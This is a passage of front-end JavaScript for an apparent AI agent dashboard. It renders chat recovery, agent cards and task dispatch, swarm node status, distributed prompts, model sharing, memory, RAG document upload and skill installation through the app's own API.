  function autoSaveChat() {
    try {
      var msgs = document.querySelectorAll('.chat-msg');
      if (msgs.length === 0) return;
      var data = [];
      for (var i = 0; i < msgs.length; i++) {
        var role = msgs[i].classList.contains('user') ? 'user' : 'assistant';
        var body = msgs[i].querySelector('.msg-body');
        data.push({ role: role, content: body ? body.textContent : '' });
      }
      localStorage.setItem('aries-chat-autosave', JSON.stringify({ timestamp: Date.now(), messages: data }));
    } catch (e) {}
  }

  function checkChatRecovery() {
    try {
      var saved = localStorage.getItem('aries-chat-autosave');
      if (!saved) return;
      var data = JSON.parse(saved);
      if (!data.messages || data.messages.length === 0) return;
      var age = Date.now() - (data.timestamp || 0);
      if (age > 3600000) { localStorage.removeItem('aries-chat-autosave'); return; }
      var container = document.getElementById('chatMessages');
      if (container && container.children.length === 0) {
        var recDiv = document.createElement('div');
        recDiv.className = 'chat-msg system';
        recDiv.style.cursor = 'pointer';
        recDiv.innerHTML = '<div class="msg-body">\u{1F4BE} Found ' + data.messages.length + ' unsaved messages. <strong style="color:var(--accent)">Click to restore.</strong></div>';
        recDiv.onclick = function() {
          recDiv.remove();
          for (var i = 0; i < data.messages.length; i++) appendChatMessage(data.messages[i].role, data.messages[i].content);
          toast('Chat restored!', 'success');
        };
        container.appendChild(recDiv);
      }
    } catch (e) {}
  }

  function showChatTyping() { var el = document.getElementById('chatTyping'); if (el) el.style.display = 'flex'; }
  function hideChatTyping() { var el = document.getElementById('chatTyping'); if (el) el.style.display = 'none'; }

  // ═══════════════════════════════
  //  AGENTS
  // ═══════════════════════════════
  function refreshAgents() {
    api('GET', 'workers', null, {}).then(function(data) {
      var grid = document.getElementById('agentGrid');
      var agents = data.agents || [];
      _cachedAgents = agents;
      if (agents.length === 0) { grid.innerHTML = '<div class="info-content">No agents found.</div>'; return; }
      // Agent color palette - unique color per agent
      var agentColors = ['#f59e0b','#22c55e','#06b6d4','#3b82f6','#a855f7','#ef4444','#f97316','#ec4899','#10b981','#eab308','#6366f1','#14b8a6','#e879f9','#64748b'];
      var html = '';
      for (var i = 0; i < agents.length; i++) {
        var a = agents[i];
        var statusClass = (a.status === 'working' || a.status === 'busy') ? 'working' : 'idle';
        var icon = getAgentIcon(a.role || a.name);
        var color = a.color ? ('var(--' + a.color + ', ' + agentColors[i % agentColors.length] + ')') : agentColors[i % agentColors.length];
        var statusDot = statusClass === 'working' ? '&#x1F7E2;' : '&#x1F7E1;';
        var statusText = statusClass === 'working' ? 'Active' : 'Standby';
        html += '<div class="agent-card" style="border-left:3px solid ' + color + ';cursor:pointer;transition:transform 0.15s,box-shadow 0.15s" onclick="window.aries.openAgentDetail(\'' + escapeHtml(a.id || a.name || 'agent-' + i) + '\')" onmouseenter="this.style.transform=\'scale(1.03)\';this.style.boxShadow=\'0 0 20px ' + color + '33\'" onmouseleave="this.style.transform=\'scale(1)\';this.style.boxShadow=\'none\'">';
        html += '<div class="agent-icon" style="font-size:28px;filter:none;background:linear-gradient(135deg,' + color + '22,' + color + '08);border-radius:8px;padding:8px;width:48px;height:48px;display:flex;align-items:center;justify-content:center">' + icon + '</div>';
        html += '<div class="agent-name" style="color:' + color + '">' + escapeHtml(a.name || 'Agent ' + i) + '</div>';
        html += '<div class="agent-role">' + escapeHtml(a.role || 'general') + '</div>';
        html += '<div class="agent-status ' + statusClass + '">' + statusDot + ' ' + statusText + '</div>';
        if (a.tasksCompleted !== undefined) html += '<div class="agent-meta" style="margin-top:4px;font-size:11px;color:var(--text-dim)">&#x2705; ' + a.tasksCompleted + ' tasks completed</div>';
        html += '</div>';
      }
      grid.innerHTML = html;
    }).catch(function() {});
  }

  function getAgentIcon(role) {
    var r = (role || '').toLowerCase();
    // Unique icon for every agent role
    if (r.indexOf('orchestrat') >= 0 || r.indexOf('commander') >= 0) return '&#x1F451;'; // 👑
    if (r.indexOf('engineer') >= 0 || r.indexOf('coder') >= 0 || r.indexOf('code') >= 0) return '&#x1F4BB;'; // 💻
    if (r.indexOf('investigat') >= 0 || r.indexOf('research') >= 0) return '&#x1F50D;'; // 🔍
    if (r.indexOf('strateg') >= 0 || r.indexOf('analy') >= 0) return '&#x1F4CA;'; // 📊
    if (r.indexOf('ideat') >= 0 || r.indexOf('creativ') >= 0 || r.indexOf('design') >= 0) return '&#x1F3A8;'; // 🎨
    if (r.indexOf('reconnais') >= 0 || r.indexOf('scout') >= 0) return '&#x1F6F0;'; // 🛰️
    if (r.indexOf('operat') >= 0 || r.indexOf('executor') >= 0) return '&#x26A1;'; // ⚡
    if (r.indexOf('guardian') >= 0 || r.indexOf('security') >= 0) return '&#x1F6E1;'; // 🛡️
    if (r.indexOf('financ') >= 0 || r.indexOf('trader') >= 0) return '&#x1F4C8;'; // 📈
    if (r.indexOf('troubleshoot') >= 0 || r.indexOf('debug') >= 0) return '&#x1F41B;'; // 🐛
    if (r.indexOf('architect') >= 0 || r.indexOf('design') >= 0) return '&#x1F3D7;'; // 🏗️
    if (r.indexOf('tuner') >= 0 || r.indexOf('optim') >= 0) return '&#x2699;'; // ⚙️
    if (r.indexOf('explor') >= 0 || r.indexOf('navigat') >= 0) return '&#x1F9ED;'; // 🧭
    if (r.indexOf('document') >= 0 || r.indexOf('scribe') >= 0 || r.indexOf('write') >= 0) return '&#x1F4DD;'; // 📝
    if (r.indexOf('ops') >= 0) return '&#x2699;';
    return '&#x1F916;';
  }

  // ═══════════════════════════════
  //  AGENT DETAIL
  // ═══════════════════════════════
  var _cachedAgents = [];
  function openAgentDetail(agentId) {
    var a = null;
    for (var i = 0; i < _cachedAgents.length; i++) {
      if ((_cachedAgents[i].id || _cachedAgents[i].name || '').toLowerCase() === agentId.toLowerCase()) { a = _cachedAgents[i]; break; }
    }
    if (!a) { a = { name: agentId, role: 'unknown' }; }
    var icon = getAgentIcon(a.role || a.name);
    var agentColors = ['#f59e0b','#22c55e','#06b6d4','#3b82f6','#a855f7','#ef4444','#f97316','#ec4899','#10b981','#eab308','#6366f1','#14b8a6'];
    var color = agentColors[0];
    for (var j = 0; j < _cachedAgents.length; j++) { if (_cachedAgents[j] === a) { color = agentColors[j % agentColors.length]; break; } }
    var statusDot = (a.status === 'working' || a.status === 'busy') ? '🟢' : '🟡';
    var statusText = (a.status === 'working' || a.status === 'busy') ? 'Active' : 'Standby';
    var specs = (a.specialties || []).map(function(s) { return '<span style="display:inline-block;padding:2px 8px;margin:2px;background:' + color + '22;color:' + color + ';border:1px solid ' + color + '44;border-radius:12px;font-size:11px">' + escapeHtml(s) + '</span>'; }).join('');
    var lastActive = a.lastActive ? new Date(a.lastActive).toLocaleString() : 'Never';
    var html = '';
    html += '<div style="display:flex;align-items:center;gap:16px;margin-bottom:20px">';
    html += '<div style="font-size:48px;background:linear-gradient(135deg,' + color + '22,' + color + '08);border-radius:12px;padding:12px;width:72px;height:72px;display:flex;align-items:center;justify-content:center">' + icon + '</div>';
    html += '<div>';
    html += '<h2 style="margin:0;color:' + color + ';font-size:22px">' + escapeHtml(a.name || agentId) + '</h2>';
    html += '<div style="color:#888;font-size:13px;margin-top:2px">' + escapeHtml(a.role || 'general') + ' · ' + statusDot + ' ' + statusText + '</div>';
    html += '</div></div>';
    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px">';
    html += '<div style="background:#0a0a0a;padding:12px;border-radius:8px;border:1px solid #222"><div style="color:#666;font-size:11px;text-transform:uppercase">Tasks Completed</div><div style="color:#eee;font-size:20px;font-weight:700;margin-top:4px">' + (a.tasksCompleted || 0) + '</div></div>';
    html += '<div style="background:#0a0a0a;padding:12px;border-radius:8px;border:1px solid #222"><div style="color:#666;font-size:11px;text-transform:uppercase">Last Active</div><div style="color:#eee;font-size:13px;margin-top:6px">' + lastActive + '</div></div>';
    html += '</div>';
    if (specs) {
      html += '<div style="margin-bottom:16px"><div style="color:#888;font-size:12px;margin-bottom:6px;text-transform:uppercase">Specialties</div>' + specs + '</div>';
    }
    if (a.systemPrompt) {
      html += '<div style="margin-bottom:16px"><div style="color:#888;font-size:12px;margin-bottom:6px;text-transform:uppercase">System Prompt</div>';
      html += '<div style="background:#0a0a0a;padding:12px;border-radius:8px;border:1px solid #222;color:#aaa;font-size:12px;line-height:1.5;max-height:150px;overflow-y:auto;white-space:pre-wrap">' + escapeHtml(a.systemPrompt) + '</div></div>';
    }
    if (a.currentTask) {
      html += '<div style="margin-bottom:16px;padding:10px;background:#f59e0b11;border:1px solid #f59e0b33;border-radius:8px"><span style="color:#f59e0b;font-size:12px">⚡ Current Task:</span> <span style="color:#eee;font-size:13px">' + escapeHtml(a.currentTask) + '</span></div>';
    }
    html += '<div style="margin-top:20px;border-top:1px solid #222;padding-top:16px">';
    html += '<div style="color:#888;font-size:12px;margin-bottom:8px;text-transform:uppercase">Send Task to ' + escapeHtml(a.name || agentId) + '</div>';
    html += '<div style="display:flex;gap:8px"><input id="agentTaskInput" placeholder="Describe a task..." style="flex:1;padding:10px;background:#0a0a0a;color:#eee;border:1px solid #333;border-radius:8px;font-size:13px" onkeydown="if(event.key===\'Enter\')window.aries.sendAgentTask(\'' + escapeHtml(a.id || a.name || agentId) + '\')" />';
    html += '<button onclick="window.aries.sendAgentTask(\'' + escapeHtml(a.id || a.name || agentId) + '\')" style="padding:10px 18px;background:' + color + ';color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:13px">Send &#x27A4;</button></div>';
    html += '<div id="agentTaskResult" style="margin-top:12px"></div>';
    html += '</div>';
    document.getElementById('agentDetailContent').innerHTML = html;
    var modal = document.getElementById('agentDetailModal');
    modal.style.display = 'flex';
    modal.onclick = function(e) { if (e.target === modal) closeAgentDetail(); };
    setTimeout(function() { var inp = document.getElementById('agentTaskInput'); if (inp) inp.focus(); }, 100);
  }

  function closeAgentDetail() {
    document.getElementById('agentDetailModal').style.display = 'none';
  }

  function sendAgentTask(agentId) {
    var inp = document.getElementById('agentTaskInput');
    var task = inp ? inp.value.trim() : '';
    if (!task) return;
    var resultDiv = document.getElementById('agentTaskResult');
    resultDiv.innerHTML = '<div style="color:#06b6d4;font-size:12px">⏳ Sending task to ' + escapeHtml(agentId) + '...</div>';
    inp.disabled = true;
    api('POST', 'chat/stream', { message: '[Agent: ' + agentId + '] ' + task, agent: agentId }).then(function(data) {
      var response = data.response || data.text || data.content || 'Task sent successfully';
      resultDiv.innerHTML = '<div style="background:#0a0a0a;padding:12px;border-radius:8px;border:1px solid #333;color:#eee;font-size:13px;line-height:1.5;max-height:200px;overflow-y:auto;white-space:pre-wrap">' + escapeHtml(response) + '</div>';
      inp.disabled = false;
      inp.value = '';
      refreshAgents();
    }).catch(function(err) {
      resultDiv.innerHTML = '<div style="color:#ef4444;font-size:12px">❌ ' + escapeHtml(err.message || 'Failed to send task') + '</div>';
      inp.disabled = false;
    });
  }

  // ═══════════════════════════════
  //  SWARM
  // ═══════════════════════════════
  function refreshSwarm() {
    api('GET', 'status').then(function(data) {
      var nodesDiv = document.getElementById('swarmNodes');
      var swarm = data.swarm || {};
      var nodes = swarm.nodes || {};
      var html = '';
      var local = nodes.local || {};
      html += buildNodeCard('&#x1F4BB; Local', local.status || 'active', ['Workers: ' + (local.workers || 0), 'Concurrency: ' + (local.concurrency || 0)]);
      var vultr = nodes.vultr || {};
      html += buildNodeCard('&#x2601; Vultr Dallas', vultr.status || 'unknown', ['IP: ' + (vultr.ip || 'N/A'), 'Workers: ' + (vultr.workers || 0)]);
      var gcp = nodes.gcp || {};
      html += buildNodeCard('&#x2601; GCP', gcp.status || 'unknown', ['IP: ' + (gcp.ip || 'N/A'), 'Workers: ' + (gcp.workers || 0)]);
      html += '<div class="swarm-node"><div class="node-header"><span class="node-name">&#x1F4CA; Summary</span></div><div class="node-stats">';
      html += '<div>Total Agents: ' + (swarm.totalAgents || 0) + '</div>';
      html += '<div>Total Workers: ' + (swarm.totalWorkers || 0) + '</div></div></div>';
      nodesDiv.innerHTML = html;
      setText('statAgents', String(data.totalAgents || swarm.totalAgents || 0));
      setText('statWorkers', String(data.workers || swarm.totalWorkers || 0));
      setText('statUptime', formatUptime(data.uptime || 0));
      renderSwarmViz(nodes);
    }).catch(function() {});
    // Update network stats bar
    api('GET', 'network/stats', null, {}).then(function(ns) {
      setText('netStatNodes', String(ns.totalNodes || 0));
      setText('netStatTasks', String(ns.tasksProcessed || 0));
      var el = document.getElementById('netStatUptime');
      if (el) el.textContent = formatUptime(ns.yourUptime || 0);
    }).catch(function() {});
  }

  function renderSwarmViz(nodes) {
    var viz = document.getElementById('swarmViz');
    if (!viz) return;
    var nodeKeys = Object.keys(nodes);
    if (nodeKeys.length === 0) { viz.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-dim);font-size:13px">No nodes</div>'; return; }
    var w = viz.clientWidth || 400, h = viz.clientHeight || 220;
    var cx = w / 2, cy = h / 2;
    var html = '<div class="swarm-viz-node online" style="left:' + (cx - 30) + 'px;top:' + (cy - 30) + 'px"><div>&#x1F3E0;<br>Local</div></div>';
    var angle = 0, radius = Math.min(w, h) * 0.35;
    for (var i = 0; i < nodeKeys.length; i++) {
      if (nodeKeys[i] === 'local') continue;
      var n = nodes[nodeKeys[i]];
      var status = (n.status || 'unknown') === 'active' ? 'online' : 'offline';
      var nx = cx + radius * Math.cos(angle) - 30;
      var ny = cy + radius * Math.sin(angle) - 30;
      var dx = nx + 30 - cx, dy = ny + 30 - cy;
      var len = Math.sqrt(dx * dx + dy * dy);
      var rot = Math.atan2(dy, dx) * 180 / Math.PI;
      html += '<div class="swarm-viz-line" style="left:' + cx + 'px;top:' + cy + 'px;width:' + len + 'px;transform:rotate(' + rot + 'deg)"></div>';
      html += '<div class="swarm-viz-node ' + status + '" style="left:' + nx + 'px;top:' + ny + 'px"><div>&#x2601;<br>' + escapeHtml(nodeKeys[i].substring(0, 8)) + '</div></div>';
      angle += (2 * Math.PI) / Math.max(nodeKeys.length - 1, 1);
    }
    viz.innerHTML = html;
  }

  function buildNodeCard(name, status, lines) {
    var badgeClass = status === 'active' ? 'active' : 'unknown';
    var html = '<div class="swarm-node"><div class="node-header"><span class="node-name">' + name + '</span><span class="node-badge ' + badgeClass + '">' + escapeHtml(status) + '</span></div><div class="node-stats">';
    for (var i = 0; i < lines.length; i++) html += '<div>' + escapeHtml(lines[i]) + '</div>';
    return html + '</div></div>';
  }

  function submitSwarmTask() {
    var input = document.getElementById('swarmTaskInput');
    var task = input.value.trim();
    if (!task) { toast('Enter a task', 'error'); return; }
    document.getElementById('swarmProgress').style.display = 'block';
    document.getElementById('swarmResult').style.display = 'none';
    document.getElementById('swarmBar').style.width = '10%';
    setText('swarmStatus', 'Submitting...');
    var pi = setInterval(function() { var bar = document.getElementById('swarmBar'); var c = parseFloat(bar.style.width) || 10; if (c < 90) bar.style.width = (c + 5) + '%'; }, 2000);
    api('POST', 'swarm', { task: task }).then(function(data) {
      clearInterval(pi); document.getElementById('swarmBar').style.width = '100%'; setText('swarmStatus', 'Complete!');
      var r = document.getElementById('swarmResult'); r.style.display = 'block';
      r.textContent = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);
      input.value = '';
    }).catch(function() { clearInterval(pi); setText('swarmStatus', 'Failed'); document.getElementById('swarmBar').style.width = '0%'; });
  }

  function handleSwarmEvent(data) {
    if (data.event === 'agent-start') setText('swarmStatus', 'Agent: ' + (data.agent || ''));
    else if (data.event === 'agent-complete') { var bar = document.getElementById('swarmBar'); var c = parseFloat(bar.style.width) || 10; if (c < 90) bar.style.width = (c + 10) + '%'; }
    else if (data.event === 'complete') { document.getElementById('swarmBar').style.width = '100%'; setText('swarmStatus', 'Complete!'); }
  }

  // ═══════════════════════════════
  //  DISTRIBUTED AI
  // ═══════════════════════════════
  function runDistributedAi() {
    var prompt = (document.getElementById('distAiPrompt') || {}).value;
    if (!prompt || !prompt.trim()) { toast('Enter a prompt', 'error'); return; }
    var strategy = (document.getElementById('distAiStrategy') || {}).value || 'split';
    var prog = document.getElementById('distAiProgress');
    var bar = document.getElementById('distAiBar');
    var status = document.getElementById('distAiStatus');
    var result = document.getElementById('distAiResult');
    if (prog) prog.style.display = 'block';
    if (result) result.style.display = 'none';
    if (bar) bar.style.width = '10%';
    if (status) status.textContent = 'Submitting...';
    api('POST', 'ai/distributed', { prompt: prompt.trim(), strategy: strategy }).then(function(data) {
      if (bar) bar.style.width = '100%';
      if (status) status.textContent = 'Complete!';
      if (result) {
        result.style.display = 'block';
        var r = data.result || {};
        result.textContent = r.combined || r.best || r.final || JSON.stringify(r, null, 2);
      }
    }).catch(function(e) {
      if (bar) bar.style.width = '0%';
      if (status) status.textContent = 'Failed: ' + e.message;
    });
  }

  function handleDistributedAiEvent(data) {
    var bar = document.getElementById('distAiBar');
    var status = document.getElementById('distAiStatus');
    if (!bar || !status) return;
    if (data.event === 'progress') {
      var pct = parseFloat(bar.style.width) || 10;
      if (pct < 90) bar.style.width = (pct + 8) + '%';
      status.textContent = (data.phase || '') + (data.worker ? ' → ' + data.worker : '') + (data.stage ? ' (stage ' + data.stage + ')' : '');
    } else if (data.event === 'complete') {
      bar.style.width = '100%';
      status.textContent = 'Complete!';
    } else if (data.event === 'error') {
      status.textContent = 'Error: ' + (data.error || 'unknown');
    }
  }

  function refreshModelMatrix() {
    var el = document.getElementById('modelMatrix');
    if (!el) return;
    el.innerHTML = '<div class="spinner"></div> Loading...';
    api('GET', 'swarm/models').then(function(data) {
      var workers = data.workers || {};
      var models = data.models || {};
      var wIds = Object.keys(workers);
      var mNames = Object.keys(models);
      if (wIds.length === 0) { el.innerHTML = '<div style="color:var(--text-dim)">No workers found</div>'; return; }
      var html = '<table style="width:100%;border-collapse:collapse;font-size:12px"><thead><tr><th style="text-align:left;padding:4px;border-bottom:1px solid var(--border)">Model</th>';
      for (var i = 0; i < wIds.length; i++) {
        var w = workers[wIds[i]];
        html += '<th style="padding:4px;border-bottom:1px solid var(--border)">' + escapeHtml(w.hostname || wIds[i]) + '<br><span style="color:' + (w.online ? 'var(--green)' : 'var(--text-dim)') + ';font-size:10px">' + (w.online ? '● online' : '○ offline') + '</span></th>';
      }
      html += '</tr></thead><tbody>';
      for (var j = 0; j < mNames.length; j++) {
        html += '<tr><td style="padding:4px;border-bottom:1px solid var(--border);color:var(--accent)">' + escapeHtml(mNames[j]) + '</td>';
        for (var k = 0; k < wIds.length; k++) {
          var has = (workers[wIds[k]].models || []).indexOf(mNames[j]) >= 0;
          html += '<td style="padding:4px;text-align:center;border-bottom:1px solid var(--border)">';
          if (has) html += '<span style="color:var(--green)">✓</span>';
          else html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.shareModelTo(\'' + escapeHtml(mNames[j]) + '\',\'' + escapeHtml(wIds[k]) + '\')">Share</button>';
          html += '</td>';
        }
        html += '</tr>';
      }
      html += '</tbody></table>';
      el.innerHTML = html;
    }).catch(function(e) { el.innerHTML = '<div style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</div>'; });
  }

  function shareModelTo(model, toWorker) {
    // Find a worker that has this model
    api('GET', 'swarm/models').then(function(data) {
      var models = data.models || {};
      var sources = models[model] || [];
      if (sources.length === 0) { toast('No source worker has this model', 'error'); return; }
      var from = sources[0];
      api('POST', 'swarm/models/share', { model: model, fromWorker: from, toWorkers: [toWorker] }).then(function(r) {
        toast('Model share initiated: ' + model + ' → ' + toWorker, 'success');
      }).catch(function(e) { toast('Share failed: ' + e.message, 'error'); });
    });
  }

  // ═══════════════════════════════
  //  MEMORY / RAG / SKILLS
  // ═══════════════════════════════
  function loadMemory() {
    var el = document.getElementById('memoryContent');
    el.innerHTML = '<div class="spinner"></div> Loading...';
    api('GET', 'memory').then(function(data) {
      var memories = data.memories || [];
      var stats = data.stats || {};
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + (stats.total || memories.length) + '</div><div class="stat-card-label">Entries</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Add Memory</h3>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px"><input id="memKey" type="text" placeholder="Key" class="input-field" /><input id="memCategory" type="text" placeholder="Category" class="input-field" /></div>';
      html += '<div style="display:flex;gap:8px"><input id="memValue" type="text" placeholder="Value" class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.addMemory()">Save</button></div></div>';
      if (memories.length > 0) {
        html += '<table class="data-table"><tr><th>Key</th><th>Category</th><th>Value</th></tr>';
        for (var i = 0; i < Math.min(memories.length, 50); i++) {
          var m = memories[i];
          html += '<tr><td>' + escapeHtml(m.key || '') + '</td><td><span style="color:var(--accent)">' + escapeHtml(m.category || 'general') + '</span></td><td>' + escapeHtml(String(m.value || '').substring(0, 100)) + '</td></tr>';
        }
        html += '</table>';
      } else html += '<p style="color:var(--text-dim)">No memories yet.</p>';
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; });
  }

  function addMemory() {
    var key = document.getElementById('memKey').value.trim();
    var value = document.getElementById('memValue').value.trim();
    var category = document.getElementById('memCategory').value.trim() || 'general';
    if (!key || !value) { toast('Key and value required', 'error'); return; }
    api('POST', 'memory', { key: key, value: value, category: category }).then(function() { toast('Saved!', 'success'); _loadedPanels['memory'] = false; loadMemory(); }).catch(function() {});
  }

  function loadRag() {
    var el = document.getElementById('ragContent');
    el.innerHTML = '<div class="spinner"></div> Loading...';
    api('GET', 'rag/status').then(function(data) {
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + (data.enabled ? '\u2705' : '\u274C') + '</div><div class="stat-card-label">Status</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (data.documents || 0) + '</div><div class="stat-card-label">Documents</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Search</h3>';
      html += '<div style="display:flex;gap:8px"><input id="ragSearchInput" type="text" placeholder="Search..." class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.searchRag()">Search</button></div>';
      html += '<div id="ragSearchResults" style="margin-top:8px"></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent2)">Add Document</h3>';
      html += '<textarea id="ragDocText" placeholder="Paste text..." rows="4" class="input-field" style="width:100%;resize:vertical"></textarea>';
      html += '<div style="display:flex;gap:8px;margin-top:8px"><input id="ragDocSource" type="text" placeholder="Source" class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.addRagDoc()">Ingest</button></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Upload File</h3>';
      html += '<div id="ragDropZone" style="border:2px dashed var(--border);border-radius:8px;padding:24px;text-align:center;cursor:pointer;transition:border-color 0.2s" onclick="document.getElementById(\'ragFileInput\').click()" ondragover="event.preventDefault();this.style.borderColor=\'var(--accent)\'" ondragleave="this.style.borderColor=\'var(--border)\'" ondrop="event.preventDefault();this.style.borderColor=\'var(--border)\';window.aries.uploadRagFile(event.dataTransfer.files[0])">';
      html += '<div style="font-size:28px;margin-bottom:8px">\uD83D\uDCC1</div>';
      html += '<div style="color:var(--text-dim)">Drop files here or click to browse</div>';
      html += '<div style="font-size:11px;color:var(--text-dim);margin-top:4px">.txt .md .pdf .json .csv .js .py .html (max 10MB)</div>';
      html += '<input type="file" id="ragFileInput" style="display:none" accept=".txt,.md,.pdf,.json,.csv,.js,.py,.html" onchange="if(this.files[0])window.aries.uploadRagFile(this.files[0])" />';
      html += '</div>';
      html += '<div id="ragUploadStatus" style="margin-top:8px"></div></div>';
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }

  function searchRag() {
    var q = document.getElementById('ragSearchInput').value.trim(); if (!q) return;
    var el = document.getElementById('ragSearchResults');
    el.innerHTML = '<div class="spinner"></div>';
    api('POST', 'rag', { query: q }).then(function(d) {
      var r = d.results || [];
      if (!r.length) { el.innerHTML = '<p style="color:var(--text-dim)">No results.</p>'; return; }
      var html = '';
      for (var i = 0; i < r.length; i++) {
        html += '<div style="padding:8px;margin:4px 0;background:var(--bg);border-radius:6px;border-left:3px solid var(--accent)">';
        html += '<div style="font-size:11px;color:var(--text-dim)">Score: ' + ((r[i].score || 0) * 100).toFixed(0) + '%</div>';
        html += '<div style="font-size:13px">' + escapeHtml((r[i].text || r[i].content || '').substring(0, 200)) + '</div></div>';
      }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }

  function addRagDoc() {
    var text = document.getElementById('ragDocText').value.trim();
    var source = document.getElementById('ragDocSource').value.trim() || 'manual';
    if (!text) { toast('Enter text', 'error'); return; }
    api('POST', 'rag', { text: text, source: source }).then(function(d) {
      toast('Ingested! Chunks: ' + (d.document ? d.document.chunkCount : '?'), 'success');
      _loadedPanels['rag'] = false; loadRag();
    }).catch(function() {});
  }

  function uploadRagFile(file) {
    if (!file) return;
    var statusEl = document.getElementById('ragUploadStatus');
    if (statusEl) statusEl.innerHTML = '<div class="spinner" style="display:inline-block;width:16px;height:16px"></div> Uploading ' + escapeHtml(file.name) + '...';
    var formData = new FormData();
    formData.append('file', file);
    fetch('/api/rag/upload', { method: 'POST', body: formData }).then(function(r) { return r.json(); }).then(function(d) {
      if (d.error) { toast(d.error, 'error'); if (statusEl) statusEl.innerHTML = '<span style="color:var(--red)">' + escapeHtml(d.error) + '</span>'; return; }
      toast('Uploaded ' + d.filename + '! Chunks: ' + (d.document ? d.document.chunkCount : '?'), 'success');
      if (statusEl) statusEl.innerHTML = '<span style="color:var(--green)">\u2705 ' + escapeHtml(d.filename) + ' ingested (' + (d.document ? d.document.chunkCount : '?') + ' chunks)</span>';
      _loadedPanels['rag'] = false; loadRag();
    }).catch(function(e) { toast('Upload failed', 'error'); if (statusEl) statusEl.innerHTML = '<span style="color:var(--red)">Upload failed</span>'; });
  }

  function loadSkills() {
    var el = document.getElementById('skillsContent');
    el.innerHTML = '<div class="spinner"></div> Loading...';
    Promise.all([
      api('GET', 'skills').catch(function() { return { skills: [], localSkills: [] }; }),
      api('GET', 'skills/bridge/local').catch(function() { return { skills: [] }; })
    ]).then(function(results) {
      var installed = results[0].skills || [];
      var localSkills = results[1].skills || results[0].localSkills || [];
      var html = '<div style="margin-bottom:16px;display:flex;gap:8px"><input id="skillSearchInput" type="text" placeholder="Search ClawhHub..." class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.searchSkills()">&#x1F50D; Search</button></div><div id="hubSearchResults"></div>';
      if (installed.length > 0) {
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">\u2705 Installed (' + installed.length + ')</h3><div class="agent-grid">';
        for (var i = 0; i < installed.length; i++) html += '<div class="agent-card"><div class="agent-icon">&#x1F527;</div><div class="agent-name">' + escapeHtml(installed[i].name || '') + '</div><div class="agent-role">' + escapeHtml(installed[i].description || '') + '</div></div>';
        html += '</div>';
      }
      if (localSkills.length > 0) {
        html += '<h3 style="color:var(--accent2);margin:16px 0 8px">&#x1F4E6; Local (' + localSkills.length + ')</h3><div class="agent-grid">';
        for (var j = 0; j < localSkills.length; j++) {
          var ls = localSkills[j];
          html += '<div class="agent-card"><div class="agent-icon">&#x1F4E6;</div><div class="agent-name">' + escapeHtml(ls.name || '') + '</div>';
          if (!ls.imported) html += '<button class="btn-sm" onclick="window.aries.importSkill(\'' + escapeHtml(ls.name) + '\')" style="margin-top:6px">Import</button>';
          else html += '<div class="agent-status idle">Imported</div>';
          html += '</div>';
        }
        html += '</div>';
      }
      if (!installed.length && !localSkills.length) html += '<p style="color:var(--text-dim)">No skills found.</p>';
      el.innerHTML = html;
    });
  }

  function searchSkills() {
    var q = document.getElementById('skillSearchInput').value.trim(); if (!q) return;
    var el = document.getElementById('hubSearchResults');
    el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'skills/bridge/search?q=' + encodeURIComponent(q)).then(function(d) {
      var r = d.results || [];
      if (!r.length) { el.innerHTML = '<p style="color:var(--text-dim)">No results.</p>'; return; }
      var html = '<div class="agent-grid">';
      for (var i = 0; i < r.length; i++) html += '<div class="agent-card"><div class="agent-icon">&#x2601;</div><div class="agent-name">' + escapeHtml(r[i].name || r[i].id || '') + '</div><button class="btn-sm" onclick="window.aries.installHubSkill(\'' + escapeHtml(r[i].id || r[i].name || '') + '\')" style="margin-top:6px">Install</button></div>';
      el.innerHTML = html + '</div>';
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }

  function importSkill(name) { toast('Importing...', 'info'); api('POST', 'skills/bridge/install', { name: name }).then(function(d) { if (d.imported) { toast('Imported!', 'success'); _loadedPanels['skills'] = false; loadSkills(); } else toast('Failed', 'error'); }).catch(function() {}); }
  function installHubSkill(id) { toast('Installing...', 'info'); api('POST', 'skills/bridge/install', { skillId: id }).then(function(d) { if (d.installed) { toast('Installed!', 'success'); _loadedPanels['skills'] = false; loadSkills(); } else toast('Failed', 'error'); }).catch(function() {}); }

  // ═══════════════════════════════
  //  BROWSER / SANDBOX / SEARCH / GATEWAY / EVOLVE / SENTINEL / LOGS / BACKUP
  // ═══════════════════════════════
  function loadBrowser() {
    var el = document.getElementById('browserContent');
    el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'browser/status').then(function(d) {
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + (d.enabled ? '\u2705' : '\u274C') + '</div><div class="stat-card-label">Enabled</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Navigate</h3>';
